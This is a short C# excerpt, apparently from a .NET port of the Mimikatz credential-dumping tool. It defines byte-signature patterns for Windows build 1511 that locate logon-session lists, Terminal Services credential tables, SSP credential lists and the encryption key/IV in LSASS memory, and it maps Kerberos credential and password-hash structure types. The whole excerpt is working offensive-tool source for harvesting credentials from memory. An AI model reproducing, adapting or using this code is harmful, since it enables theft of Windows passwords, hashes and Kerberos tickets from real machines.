...
{
    internal class WinBuild1511 : IWinBuild
    {
        ...
        private byte[] PTRN_WALL_TSGlobalCredTable = { 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d };
        private byte[] PTRN_WALL_KerbUnloadLogonSessionTable = { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
        private byte[] PTRN_WALL_LiveLocateLogonSession = { 0x74, 0x25, 0x8b };
        private byte[] PTRN_WIN10_SspCredentialList = { 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15 };
        private byte[] PTRN_WIN6_PasswdSet = { 0x48, 0x3b, 0xd9, 0x74 };
        private byte[] PTRN_WN6x_LogonSessionList = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        private byte[] keyIVSigAll = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
        ...
        public WinBuild1511()
        {
            ...
            LogonSessionType = typeof(SharpKerberos.KIWI_KERBEROS_LOGON_SESSION_10);
            LogonSessionTypeSize = Marshal.SizeOf(typeof(SharpKerberos.KIWI_KERBEROS_LOGON_SESSION_10));
            KerberosPrimaryCredentialType = typeof(SharpKerberos.KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
            KerberosPrimaryCredentialTypeSize = Marshal.SizeOf(typeof(SharpKerberos.KIWI_KERBEROS_10_PRIMARY_CREDENTIAL));
            TSCredType = typeof(Tspkg.KIWI_TS_CREDENTIAL);

            KerberosLogonSessionType = typeof(SharpKerberos.KIWI_KERBEROS_LOGON_SESSION_10);
            KerberosHashType = typeof(SharpKerberos.KERB_HASHPASSWORD_6);
